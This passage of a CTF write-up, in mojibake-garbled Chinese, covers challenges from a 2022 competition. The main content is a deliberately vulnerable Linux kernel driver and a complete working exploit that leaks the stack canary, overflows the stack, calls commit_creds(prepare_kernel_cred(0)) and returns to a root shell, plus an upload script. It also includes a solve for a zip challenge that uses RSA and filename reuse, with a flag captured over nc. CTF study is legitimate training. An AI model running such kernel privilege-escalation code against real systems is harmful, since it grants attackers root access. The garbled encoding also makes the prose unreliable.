///linux/fs.hä¸­çš„file_operationsç»“æ„ä½“åˆ—å‡ºäº†æ‰€æœ‰æ“ä½œç³»ç»Ÿå…è®¸çš„å¯¹è®¾å¤‡æ–‡ä»¶çš„æ“ä½œã€‚åœ¨æˆ‘ä»¬çš„é©±åŠ¨ä¸­ï¼Œéœ€è¦å°†å…¶ä¸­éœ€è¦çš„å‡½æ•°è¿›è¡Œå®ç°ã€‚ä¸‹é¢è¿™ä¸ªç»“æ„ä½“å°±æ˜¯å‘æ“ä½œç³»ç»Ÿå£°æ˜ï¼Œé‚£äº›è§„å®šå¥½çš„æ“ä½œåœ¨æœ¬æ¨¡å—é‡Œæ˜¯ç”±å“ªä¸ªå‡½æ•°å®ç°çš„ã€‚ä¾‹å¦‚ä¸‹æ–‡å°±è¡¨ç¤ºunlocked_ioctlæ˜¯ç”±æœ¬æ¨¡å—ä¸­çš„HRP_module_ioctl()å‡½æ•°å®ç°çš„ã€‚
static const struct file_operations HRP_module_fo = {
        .owner = THIS_MODULE,
        .unlocked_ioctl = HRP_module_ioctl,
        .write=HRP_module_write,
        .read=HRP_module_read,
};

//æœ¬æ¨¡å—ioctlå›è°ƒå‡½æ•°çš„å®ç°
static ssize_t HRP_module_write (struct file * file, const char __user * user, size_t size, loff_t * p)
{
        
    printk(KERN_INFO "USE MY write\n");
    copy_from_user(pwn,user, size);
    
    return 114514;
}
static ssize_t HRP_module_read (struct file * file, char __user * user , size_t size, loff_t *p)
{
        char this_buf[0x40]="welcome to my house\n";
    printk(KERN_INFO "USE MY read\n");
    copy_to_user(user,&this_buf[size],0x40);
    return 114514;
}

static long HRP_module_ioctl(struct file *file,        /* ditto */
                 unsigned int cmd,      /* number and param for ioctl */
                 unsigned long param)
{
        /* ioctlå›è°ƒå‡½æ•°ä¸­ä¸€èˆ¬éƒ½ä½¿ç”¨switchç»“æ„æ¥å¤„ç†ä¸åŒçš„è¾“å…¥å‚æ•°ï¼ˆcmdï¼‰ */
        switch(cmd){
        case 0:
        {
                char leak[0x10]="NONO!";
                printk(KERN_INFO "[HRPModule:] NOTHING! %s\n",leak);
                 __asm__(
                "mov $0x100,%rcx;"
                "mov $pwn,%rsi;"
                "mov %rsp,%rdi;"
                "xor %eax,%eax;"
                "rep movsb;"
                );
                break;
        }
        default:
                printk(KERN_INFO "[HRPModule:] Unknown ioctl cmd!\n");
                return -EINVAL;
        }
        return 0;
}


static int __init HRP_init(void){
        printk(KERN_INFO "[HRPModule:] Entering HRP module. \n");
        // åœ¨åŠ è½½æœ¬æ¨¡å—æ—¶ï¼Œé¦–å…ˆå‘æ“ä½œç³»ç»Ÿæ³¨å†Œä¸€ä¸ªchrdevï¼Œä¹Ÿå³å­—èŠ‚è®¾å¤‡ï¼Œä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸ºï¼šä¸»è®¾å¤‡å·ï¼ˆå¡«å†™0å³ä¸ºç­‰å¾…ç³»ç»Ÿåˆ†é…ï¼‰ï¼Œè®¾å¤‡åç§°ä»¥åŠfile_operationçš„ç»“æ„ä½“ã€‚è¿”å›å€¼ä¸ºç³»ç»Ÿåˆ†é…çš„ä¸»è®¾å¤‡å·ã€‚
        majorNumber = register_chrdev(0, DEVICE_NAME, &HRP_module_fo);
        if(majorNumber < 0){
                printk(KERN_INFO "[HRPModule:] Failed to register a major number. \n");
                return majorNumber;
        }
        printk(KERN_INFO "[HRPModule:] Successful to register a major number %d. \n", majorNumber);

        //æ¥ä¸‹æ¥ï¼Œæ³¨å†Œè®¾å¤‡ç±»
        HRP_module_class = class_create(THIS_MODULE, CLASS_NAME);
        if(IS_ERR(HRP_module_class)){
                unregister_chrdev(majorNumber, DEVICE_NAME);
                printk(KERN_INFO "[HRPModule:] Class device register failed!\n");
                return PTR_ERR(HRP_module_class);
        }
        printk(KERN_INFO "[HRPModule:] Class device register success!\n");

        //æœ€åï¼Œä½¿ç”¨device_createå‡½æ•°æ³¨å†Œè®¾å¤‡é©±åŠ¨
        HRP_module_device = device_create(HRP_module_class, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
        if (IS_ERR(HRP_module_device)){               // Clean up if there is an error
                class_destroy(HRP_module_class);           // Repeated code but the alternative is goto statements
                unregister_chrdev(majorNumber, DEVICE_NAME);
                printk(KERN_ALERT "Failed to create the device\n");
                return PTR_ERR(HRP_module_device);
        }
        printk(KERN_INFO "[HRPModule:] HRP module register successful. \n");
        return 0;
}


static void __exit HRP_exit(void)
{
        //é€€å‡ºæ—¶ï¼Œä¾æ¬¡æ¸…ç†ç”Ÿæˆçš„device, classå’Œchrdevã€‚è¿™æ ·å°±å°†ç³»ç»Ÿ/devä¸‹çš„è®¾å¤‡æ–‡ä»¶åˆ é™¤ï¼Œå¹¶è‡ªåŠ¨æ³¨é”€äº†/proc/devicesçš„è®¾å¤‡ã€‚
        printk(KERN_INFO "[HRPModule:] Start to clean up module.\n");
        device_destroy(HRP_module_class, MKDEV(majorNumber, 0));
        class_destroy(HRP_module_class);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        printk(KERN_INFO "[HRPModule:] Clean up successful. Bye.\n");

}

module_init(HRP_init);
module_exit(HRP_exit);

```

#### é‡ç‚¹

è¿™é‡Œæ˜¯æ„é€ qmemcpyè¿›è¡Œæº¢å‡ºï¼Œè¿™ä¸ªå†…å­˜å¤åˆ¶æ“ä½œåªæœ‰æ±‡ç¼–èƒ½å®Œæˆè¿™æ ·çš„æº¢å‡ºï¼Œæ™®é€šçš„strcpyï¼Œmemcpyä¼šè¢«GCCç¼–è¯‘çš„æ—¶å€™åœ¨å‡½æ•°é‡Œç›´æ¥å¼ºå¡æ£€æµ‹å‡½æ•°ï¼Œæœç»äº†æº¢å‡ºæ“ä½œï¼Œæ‰€ä»¥åœ¨ç°å®ä¸­ï¼ŒçœŸæœ‰è¿™ä¹ˆæ“è›‹çš„æº¢å‡ºåŸºæœ¬ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œåªæ˜¯ä¸ºäº†å­¦ä¹ ç ”ç©¶ã€‚

```c
__asm__(
                "mov $0x100,%rcx;"
                "mov $pwn,%rsi;"
                "mov %rsp,%rdi;"
                "xor %eax,%eax;"
                "rep movsb;"
                );
```

#### æ”»å‡»æ€è·¯

å…ˆçœ‹readå‡½æ•°ï¼Œæ³„éœ²canary

è¿™é‡Œcopy\_to\_userå¯ä»¥æŠŠå†…æ ¸ç©ºé—´çš„æ•°æ®ç»™åˆ°ç”¨æˆ·ï¼Œå¤§å°é™åˆ¶å›ºå®š0x40ï¼Œåˆšå¥½bufæ•°ç»„å¤§å°ä¹Ÿæ˜¯0x40ï¼Œæ‰€ä»¥åœ¨EXPé‡Œé¢åˆ°æ—¶å€™readå›æ¥çš„æ—¶å€™ä¸‹æ ‡ä¸º0çš„åœ°æ–¹å°±æ˜¯canaryäº†

```c
static ssize_t HRP_module_read (struct file * file, char __user * user , size_t size, loff_t *p)
{
        char this_buf[0x40]="welcome to my house\n";
    printk(KERN_INFO "USE MY read\n");
    copy_to_user(user,&this_buf[size],0x40);
    return 114514;
}
```

writeå‡½æ•°å¯ä»¥æŠŠç”¨æˆ·çš„æ•°æ®ç»™åˆ°å†…æ ¸ä¸­ï¼Œè¿™é‡Œæ˜¯ä¿å­˜åœ¨BSSæ®µä¸Š

```c
static ssize_t HRP_module_write (struct file * file, const char __user * user, size_t size, loff_t * p)
{
        
    printk(KERN_INFO "USE MY write\n");
    copy_from_user(pwn,user, size);
    
    return 114514;
}
```

ç»“åˆioctlä¸­çš„å†…å­˜å¤åˆ¶æ“ä½œï¼Œå¯ä»¥é€ æˆå¾ˆå¤§çš„æº¢å‡ºã€‚

è¿™æ ·æ€è·¯å°±å¾ˆç®€å•çš„ï¼Œå¡«å……canaryï¼Œå¡«å……ç”¨æˆ·æ€åˆ©ç”¨å‡½æ•°åœ°å€å°±è¡Œäº†ã€‚

#### EXP

æˆ‘å¼€å¯äº†åŠ¨æ€åœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥åœ¨initæå‰ä¿å­˜äº†ä¹ æƒ¯åœ°å€ï¼Œç»™é€‰æ‰‹ç”¨æ¥è®¡ç®—åç§»ï¼Œfind\_symbolså‡½æ•°å°±æ˜¯è®¡ç®—offsetå’Œå¯»æ‰¾çœŸå®åœ°å€çš„

save\_statuså‡½æ•°æ˜¯ç”¨æ¥ä¿å­˜ç”¨æˆ·æ€çš„æ ˆæƒ…å†µçš„ï¼Œä»å†…æ ¸åˆ°ç”¨æˆ·æ€çš„è¿‡ç¨‹ä¸­ï¼Œæ ˆæƒ…å†µæ˜¯å†…æ ¸çš„ï¼Œå¦‚æœæœ€åè¿”å›åˆ°ç”¨æˆ·æ€æ‰§è¡Œå®Œäº†ä»£ç ä½†æ˜¯å’©æœ‰è¿˜åŸåˆ°ç”¨æˆ·æ€çš„æ ˆï¼Œä½ æ‰§è¡Œäº†ä¹Ÿæ²¡ç”¨çš„è¿˜æ˜¯shæ˜¯ä¸ä¼šè¿”å›ç»™ä½ çš„ã€‚

getå‡½æ•°ç”¨æ¥ä¿®æ”¹uidçš„ï¼Œæ‰§è¡Œcommit\_creds(prepare\_kernel\_cred(0))ä¿®æ”¹UIDåˆ°rootï¼Œä¸‹é¢çš„æ±‡ç¼–å°±æ˜¯ç”¨æ¥åˆ‡æ¢åˆ°ç”¨æˆ·æ€å¹¶ä¸”æ‰§è¡Œshell çš„

```c
void get(){

    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    asm(
        "swapgs;"
        "pushq user_ss;"
        "pushq user_sp;"
        "pushq user_rflags;"
        "pushq user_cs;"
        "push $shell;"
        "iretq;");
}
```

```c
// gcc exploit.c -static -masm=intel -g -o exploit
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
/*
#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL = 0xffffffff810cd0a0;
void (*commit_creds)(void*) KERNCALL = 0xffffffff810ccc30;*/

size_t user_cs, user_ss, user_rflags, user_sp;
size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t vmlinux_base = 0;

size_t find_symbols()
{
    FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");

    if(kallsyms_fd < 0)
    {
        puts("[*]open kallsyms error!");
        exit(0);
    }

    char buf[0x30] = {0};
    while(fgets(buf, 0x30, kallsyms_fd))
    {
        if(commit_creds & prepare_kernel_cred)
            return 0;

        if(strstr(buf, "commit_creds") && !commit_creds)
        {
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &commit_creds);
            printf("commit_creds addr: %p\n", commit_creds);
            vmlinux_base = commit_creds - 0xccc30;
            printf("vmlinux_base addr: %p\n", vmlinux_base);
        }

        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
        {
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
            printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
            vmlinux_base = prepare_kernel_cred - 0xcd0a0;
        }
    }

    if(!(prepare_kernel_cred & commit_creds))
    {
        puts("[*]Error!");
        exit(0);
    }

}
void save_status()
{
    __asm__("mov %cs, user_cs;"
            "mov %ss, user_ss;"
            "mov %rsp, user_sp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}
/*
void get(){

    commit_creds(prepare_kernel_cred(0));
    asm(
        "swapgs;"
        "pushq user_ss;"
        "pushq user_sp;"
        "pushq user_rflags;"
        "pushq user_cs;"
        "push $shell;"
        "iretq;");
}*/
void get(){

    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    asm(
        "swapgs;"
        "pushq user_ss;"
        "pushq user_sp;"
        "pushq user_rflags;"
        "pushq user_cs;"
        "push $shell;"
        "iretq;");
}
void shell(){
    system("/bin/sh");
    printf("getshell!");
}
int main()
{
        save_status();
        printf("prepare_kernel_cred: %p\n",prepare_kernel_cred);
        int fd;
        fd = open("/dev/test", O_RDWR); //æˆ‘ä»¬çš„è®¾å¤‡æŒ‚è½½åœ¨/dev/testå¤„
        if (fd < 0){
                perror("Failed to open the device...");
                return 0;
        }else{
                printf("Open device successful!\n");
        }
        char buf[0x40];
        
        read(fd,buf,0x40);
        size_t canary = ((size_t *)buf)[0];
        printf("[+]canary: %p\n", canary);
        size_t rbp = ((size_t *)buf)[4];
        
        find_symbols();
        size_t rop[0x1000] = {0};
        rop[2] = canary;
        rop[3] = rbp;
        rop[4] = &get;                 // rip 
        write(fd,rop,0x100);
        ioctl(fd,0);

}

```

```text
gcc exploit.c -o exploit -no-pie -static
```

#### ä¸Šä¼ è„šæœ¬

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os
 
context.log_level = 'debug'
cmd = '$ '
 
def exploit(r):
    r.sendlineafter(cmd, 'cd /tmp')
    r.sendlineafter(cmd, 'stty -echo')
    #os.system('musl-gcc  -static -O2 ./poc/exp.c -o ./poc/exp')
    os.system('gzip -c ./exp > ./exp.gz')
    r.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64')
    r.sendline((read('./exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')
    r.sendlineafter(cmd, 'gunzip ./exp.gz')
    r.sendlineafter(cmd, 'chmod +x ./exp')
    r.interactive()
 
#p = process('./startvm.sh', shell=True)
p = remote('127.0.0.1',12132)
 
exploit(p)
```

#### tips

è°ƒè¯•çš„æ—¶å€™æŠŠinitæ–‡ä»¶æ”¹æˆrootç”¨æˆ·ï¼Œåœ¨å¯åŠ¨è„šæœ¬é‚£æŠŠkalsræ”¹æˆnokalsrï¼Œæ–¹ä¾¿è°ƒè¯•ï¼Œå…·ä½“æ“ä½œå¯ä»¥åŠ è½½ç¬¦å·è¡¨é‚£äº›çœ‹æˆ‘çš„mygdbinit

é©±åŠ¨åŠ è½½åœ°å€ç”¨lsmodæŸ¥çœ‹ï¼Œæ‰¾gadgetè‡ªå·±ç”¨ropperæ‰¾å§ï¼Œropgadgetç®—æ˜¯å¯„äº†ã€‚è¿˜æœ‰é¢˜ç›®çš„vmlinuxæå–ç”¨ä¸‹é¢è¿™ä¸ª

å› æ­¤è¿˜æœ‰ä¸€ä¸ªå·¥å…·å¯ä»¥ä½¿ç”¨ï¼š`vmlinux-to-elf`

> ä½¿ç”¨è¿™ä¸ªå·¥å…·ä¹‹å‰ç³»ç»Ÿä¸­å¿…é¡»è£…æœ‰**é«˜äº3.5**ç‰ˆæœ¬çš„python

```text
COPYsudo apt install python3-pip
sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf
```

ä½¿ç”¨æ–¹å¼ï¼š

```text
COPY# vmlinux-to-elf <input_kernel.bin> <output_kernel.elf>
vmlinux-to-elf bzImage vmlinux
```

ä¹‹åè§£å‹å‡ºæ¥çš„ vmlinux å°±æ˜¯å¸¦ç¬¦å·çš„ï¼Œå¯ä»¥æ­£å¸¸è¢« gdb è¯»å–å’Œä¸‹æ–­ç‚¹ã€‚

è°ƒè¯•ç”¨gefï¼Œä¸å¡é¡¿ï¼Œä¸ä¼šæœ‰ç¬¦å·è¡¨é—®é¢˜ï¼Œç”¨å°±å®Œäº‹äº†

```text
pip3 install capstone unicorn keystone-engine ropper
git clone https://github.com/hugsy/gef.git
echo source `pwd`/gef/gef.py >> ~/.gdbinit
```

è°ƒè¯•ç»†èŠ‚é‚£äº›ï¼Œæ‰“æ–­ç‚¹å¾ˆè®²ç©¶ï¼Œå°½é‡ä¸è¦æ‰“åœ¨push rbpä¸Šï¼›ç„¶åç›´æ¥å¤šçœ‹çœ‹å†…æ ¸é©±åŠ¨æŠ¥é”™ï¼Œå¯ä»¥çœ‹è§å‡ºé—®é¢˜çš„åœ°å€ï¼Œå˜ç›¸é€ä¸ªè°ƒè¯•å™¨ï¼ˆä¸æ˜¯ï¼‰

### zipğŸ’¼

åˆ†æå‘ç°æ­¤é¢˜å®ç°çš„zlibå‹ç¼©ï¼Œunzipéœ€è¦è´­ä¹°rootï¼Œrootçš„CDKæ ¹æ®é¢˜ç›®æç¤º

n=221 e=7ï¼Œå¯ä»¥è”æƒ³åˆ°RSAï¼Œåˆ†æCDKæ£€æµ‹ç®—æ³•å‘ç°3ä¸ªå­—ç¬¦ä¸²ç»“æœçš„æ¯”å¯¹ï¼Œå°è¯•RSAè§£å¯†

```python
import gmpy2
def Decrypt(c,e,p,q):
  L=(p-1)*(q-1)
  d=gmpy2.invert(e,L)
  n=p*q
  m=gmpy2.powmod(c,d,n)
  flag=chr(m)
  print(flag)
if __name__ == '__main__':
  p =  17
  q =  13
  e =  7
  c =  149
  Decrypt(c,e,p,q)
  c=108
  Decrypt(c,e,p,q)
  c=24
  Decrypt(c,e,p,q)

```

å¾—åˆ°CDKå°±æ˜¯HRP

zipå¯ä»¥å‹ç¼©ä»»ä½•æ–‡ä»¶å¹¶æŒ‡å®šå‹ç¼©åæ–‡ä»¶åï¼Œç›´æ¥æŠŠflagæˆ–è€…/bin/shå‹ç¼©ä¸ºpwnï¼Œæ­¤æ—¶ä¸ä¼šå½±å“ç¨‹åºè¿è¡Œï¼Œå› ä¸ºç¨‹åºæ­¤æ—¶æ²¡æœ‰ç»“æŸæ˜¯è¢«æŒ‚è½½åœ¨procç›®å½•ä¸‹çš„ã€‚

unzipåªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯è¿™é‡Œä¸éš¾å‘ç°unzipå’Œzipéƒ½æ˜¯è¢«mainæ‰€è°ƒç”¨çš„å¹¶ä¸”filenameå˜é‡å¤§å°éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåˆ©ç”¨å­å‡½æ•°åŒæ ˆå†…å­˜å¤§å°ç›¸ç­‰ï¼Œåœ¨unzipçš„æ—¶å€™å‘é€Ctrl+D(æ‰‹åŠ¨è¾“å…¥)ï¼Œç¨‹åºå°±ä¼šç»“æŸè¾“å…¥ï¼Œè¿™æ ·unzipçš„é»˜è®¤filenameå°±æ˜¯ä¸Šæ¬¡åœ¨zipè¾“å…¥çš„å‹ç¼©åçš„æ–‡ä»¶åï¼Œä¹Ÿå°±æ˜¯pwnã€‚

ç­‰ä¸‹æ¬¡å†å»ncé¢˜ç›®çš„æ—¶å€™å°±ä¼šæ‰§è¡ŒæŠ¥é”™å¾—åˆ°flagï¼ˆåŒæ–‡ä»¶åè¦†ç›–ä¸å½±å“æƒé™ï¼‰

```c
q@ubuntu:~$ nc 121.37.24.208 49472
1.zip
2.unzip
3.buy root
3
è¯·è¾“å…¥CDKï¼š
HRP

startâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦
1.zip
2.unzip
3.buy root
1
file
flag
zip file
pwn
1.zip
2.unzip
3.buy root
2
zip file
^C
q@ubuntu:~$ nc 121.37.24.208 49472
./pwn: 1: ./pwn: flag{ReT0_fFPeTM0s2VjtU3kN}: not found
```

#### éé¢„æœŸ

æ¦œä¸€å¤§å“¥Esifiel  çš„é¢˜è§£

![](Nepnep-CatCTF2022/image_CXtWBWhKkS.png)

#### æºç 

```c
#include<stdio.h>
#include <math.h>
#include<unistd.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <zlib.h>
//gcc -o zip zip.c -lz
int uid=1000;
int changdu;
int c[100];

//åŠ å¯†å‡½æ•°
void encrypt(int e,int n){       //è‡ªå·±æŒ‡å®šæŒ‡æ•°e

    //å…ˆå°†ç¬¦å·æ˜æ–‡è½¬æ¢æˆå­—æ¯æ‰€å¯¹åº”çš„asciiç ã€‚
    char mingwen[100];    //ç¬¦å·æ˜æ–‡
    printf("è¯·è¾“å…¥CDKï¼š\n");
    scanf("%10s",mingwen);
    getchar();
    changdu=strlen(mingwen);
    int ming[strlen(mingwen)];   //å®šä¹‰ç¬¦å·æ˜æ–‡
    for(int i=0;i<strlen(mingwen);i++){
    ming[i]=mingwen[i];        //å°†å­—æ¯è½¬æ¢æˆå¯¹åº”çš„asciiç ã€‚
    }
    printf("\n");
    //å¼€å§‹åŠ å¯†
    printf("startâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦\n");
    int zhuan=1;    //cä¸ºåŠ å¯†åçš„æ•°å­—å¯†æ–‡
    for(int i=0;i<strlen(mingwen);i++){

       for(int j=0;j<e;j++){
        zhuan=zhuan*ming[i]%n;
        //zhuan=zhuan%n;
       }
       c[i]=zhuan;
       //printf("%d",mi[i]);
       zhuan=1;
    }
    if(c[0]!=149||c[1]!=108||c[2]!=24)//14910824
    {
        exit(0);
    }
    else
    {
        uid=0;
    }

}
int zip(void)
{
    FILE* file;
    uLong flen;
    unsigned char* fbuf = NULL;
    uLong clen;
    unsigned char* cbuf = NULL;


    char fileName[0x2560];
    puts("file");
    scanf("%2560s",fileName);
    getchar();

    if((file = fopen(fileName, "rb")) == NULL)
    {
        printf("Can\'t open %s!\n", fileName);
        return -1;
    }
    /* è£…è½½æºæ–‡ä»¶æ•°æ®åˆ°ç¼“å†²åŒº */
    fseek(file, 0L, SEEK_END);    /* è·³åˆ°æ–‡ä»¶æœ«å°¾ */
    flen = ftell(file);        /* è·å–æ–‡ä»¶é•¿åº¦ */
    fseek(file, 0L, SEEK_SET);
    if((fbuf = (unsigned char*)malloc(sizeof(unsigned char) * flen)) == NULL)
    {
        printf("No enough memory!\n");
        fclose(file);
        return -1;
    }
    fread(fbuf, sizeof(unsigned char), flen, file);
    /* å‹ç¼©æ•°æ® */
    clen = compressBound(flen);
    if((cbuf = (unsigned char*)malloc(sizeof(unsigned char) * clen)) == NULL)
    {
        printf("No enough memory!\n");
        fclose(file);
        return -1;
    }
    if(compress(cbuf, &clen, fbuf, flen) != Z_OK)
    {
        printf("Compress %s failed!\n", fileName);
        return -1;
    }
    fclose(file);

    puts("zip file");
    scanf("%2560s",fileName);
    getchar();
    if((file = fopen(fileName, "wb")) == NULL)
    {
        printf("Can\'t create %s!\n", fileName);
        return -1;
    }
    /* ä¿å­˜å‹ç¼©åçš„æ•°æ®åˆ°ç›®æ ‡æ–‡ä»¶ */
    fwrite(&flen, sizeof(uLong), 1, file);    /* å†™å…¥æºæ–‡ä»¶é•¿åº¦ */
    fwrite(&clen, sizeof(uLong), 1, file);    /* å†™å…¥ç›®æ ‡æ•°æ®é•¿åº¦ */
    fwrite(cbuf, sizeof(unsigned char), clen, file);
    fclose(file);

    free(fbuf);
    free(cbuf);

    return 0;
}
int unzip(void)
{
    FILE* file;
    uLong flen;
    unsigned char* fbuf = NULL;
    uLong ulen;
    unsigned char* ubuf = NULL;

    char fileName[0x2560];
    puts("zip file");

    scanf("%1s",fileName);
    getchar();
    if((file = fopen(fileName, "rb")) == NULL)
    {
        printf("Can\'t open %s!\n", fileName);
        return -1;
    }
    /* è£…è½½æºæ–‡ä»¶æ•°æ®åˆ°ç¼“å†²åŒº */
    fread(&ulen, sizeof(uLong), 1, file);   /* è·å–ç¼“å†²åŒºå¤§å° */
    fread(&flen, sizeof(uLong), 1, file);   /* è·å–æ•°æ®æµå¤§å° */
    if((fbuf = (unsigned char*)malloc(sizeof(unsigned char) * flen)) == NULL)
    {
        printf("No enough memory!\n");
        fclose(file);
        return -1;
    }
    fread(fbuf, sizeof(unsigned char), flen, file);
    /* è§£å‹ç¼©æ•°æ® */
    if((ubuf = (unsigned char*)malloc(sizeof(unsigned char) * ulen)) == NULL)
    {
        printf("No enough memory!\n");
        fclose(file);
        return -1;
    }
    if(uncompress(ubuf, &ulen, fbuf, flen) != Z_OK)
    {
        printf("Uncompress %s failed!\n", fileName);
        return -1;
    }
    fclose(file);
    puts("unzip file");
    scanf("%1s",fileName);
    getchar();
    if((file = fopen(fileName, "wb")) == NULL)
    {
        printf("Can\'t create %s!\n", fileName);
        return -1;
    }
    /* ä¿å­˜è§£å‹ç¼©åçš„æ•°æ®åˆ°ç›®æ ‡æ–‡ä»¶ */
    fwrite(ubuf, sizeof(unsigned char), ulen, file);
    fclose(file);

    free(fbuf);
    free(ubuf);

    return 0;
}
void sandbox(){
    struct sock_filter filter[] = {
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4),
    BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2),
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),
    BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),
    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
    .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
}
void init()
{
    sandbox();
    setbuf(stdout,0);
    setbuf(stdin,0);

}
void buy()
{
    encrypt(7,221);
}
void menu()
{
    puts("1.zip");
    puts("2.unzip");
    puts("3.buy root");
}


int main(int argc, char const *argv[])
{
    init();
    while(1)
    {
        menu();
        int choice;
        scanf("%d",&choice);
        getchar();
        switch(choice)
        {
            case 1:zip();break;
            case 2:
            if(uid==0)
            {
                unzip();
            }break;
            case 3:buy();break;
            default:exit(0);
        }
    }
    return 0;
}
```

### welcome\_cat\_ctfğŸ‰

gdbä¿®æ”¹glodå˜é‡
set \*0x55555575e388=0x8888888
ç„¶åç§»åŠ¨åˆ°@ä¸‹é¢æŒ‰ä¸‹jï¼Œå‘æœåŠ¡å™¨å‘é€flagè·å–è¯·æ±‚å³å¯å¾—åˆ°flag

### chao ğŸŒ¿

æ„Ÿè°¢winmtå¸ˆå‚…æŠ•é€’çš„é¢˜ç›®

#### å‰è¨€

é¦–å…ˆï¼Œç¥å„ä½å¸ˆå‚…ä»¬å…ƒæ—¦å¿«ä¹ï¼Œ2023æ–°çš„ä¸€å¹´æŒ–æ´å¦‚æ°´å–ï¼Œæ‹¿shellæ‹¿åˆ°æ‰‹è½¯ï¼

å…¶å®ï¼Œè¿™ä¸ªé¢˜æˆ‘è‡ªå·±ä¹Ÿæ²¡æ„Ÿè§‰å¾ˆéš¾ï¼Œæ›´æ²¡æƒ³åˆ°åœ¨è¿™æ¬¡CATCTFè·¨å¹´èµ›ä¸Šèƒ½åšæŒºåˆ°æœ€åï¼Œæˆä¸ºPwnæ–¹å‘å”¯ä¸€ä¸€ä¸ªé›¶è§£çš„é¢˜ï¼Œåº”è¯¥æ˜¯å¸ˆå‚…ä»¬éƒ½å¿™ç€è·¨å¹´é™ªå¯¹è±¡äº†å‘œå‘œå‘œã€‚å¦‚æœæœ‰å¸ˆå‚…åœ¨è¿™é¢˜ä¸ŠèŠ±äº†å¤ªå¤šæ—¶é—´ï¼Œå½±å“äº†æ–°å¹´çš„å¥½å¿ƒæƒ…ï¼Œwinmtåœ¨æ­¤è·ªä¸‹QAQ

æœ¬é¢˜åœ¨æ¼æ´æŒ–æ˜æ–¹é¢ï¼Œè€ƒå¯Ÿäº†å»é™¤ç¬¦å·è¡¨çš„C++ç¨‹åºé€†å‘æ¢å¤ ä»¥åŠ C++ä¸­å¸¸è§çš„ç”±è™šå‡½æ•°å¼•èµ·çš„ç±»å‹æ··æ·†æ¼æ´ã€‚æœ¬é¢˜ä»£ç é‡å¹¶ä¸å¤§ï¼Œè™½ç„¶å»é™¤äº†ç¬¦å·è¡¨ï¼Œä½†æ˜¯é€†å‘æ€è·¯æ•´ä½“è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ã€‚å¼„æ¸…é€»è¾‘åï¼Œç±»å‹æ··æ·†æ¼æ´åº”è¯¥ä¹Ÿä¸éš¾å‘ç°ã€‚ä¸»è¦è€ƒå¯Ÿç‚¹åœ¨æ¼æ´åˆ©ç”¨æ–¹é¢ï¼Œå¾ˆå®¹æ˜“å‘ç°æœ‰æ ˆæº¢å‡ºï¼Œä½†æ˜¯å¹¶ä¸å¥½åˆ©ç”¨ï¼Œæ­¤å¤„éœ€è¦äº†è§£C++å¼‚å¸¸å¤„ç†çš„æ ˆå›é€€æœºåˆ¶ã€‚å…³äºC++å¼‚å¸¸æœºåˆ¶çš„Pwné¢˜å…¶å®å¾ˆæ—©å°±å‡ºç°è¿‡ï¼Œä¹Ÿå¹¶ä¸æ–°å¥‡ï¼Œä½†æ˜¯æœ¬é¢˜åœ¨catchåˆ°å¼‚å¸¸åï¼Œç›´æ¥é€€å‡ºäº†ç¨‹åºï¼Œä¹Ÿä¸å¥½ç»•è¿‡canaryä¿æŠ¤ï¼Œæ— æ³•æ ˆæº¢å‡ºã€‚ä¸è¿‡å¯è°ƒè¯•å‘ç°ï¼Œèƒ½å¤Ÿé€šè¿‡æ ˆæº¢å‡ºåŠ«æŒåˆ°å¼‚å¸¸å¤„ç†ä¸­è°ƒç”¨çš„å‡½æ•°æŒ‡é’ˆï¼Œç»§è€Œé€šè¿‡æ ˆè¿ç§»å®Œæˆåˆ©ç”¨ã€‚

ä¸‹é¢ç»™å„ä½å¸ˆå‚…ä»¬å‘ˆä¸Šæœ¬é¢˜çš„WriteUpï¼Œå¯¹æœ¬é¢˜æœ‰ä»»ä½•å…¶ä»–æƒ³æ³•çš„å¸ˆå‚…ï¼Œä¹Ÿéƒ½æ¬¢è¿æ‰¾æˆ‘ä¸€èµ·äº¤æµ\~

#### é€†å‘åˆ†æ

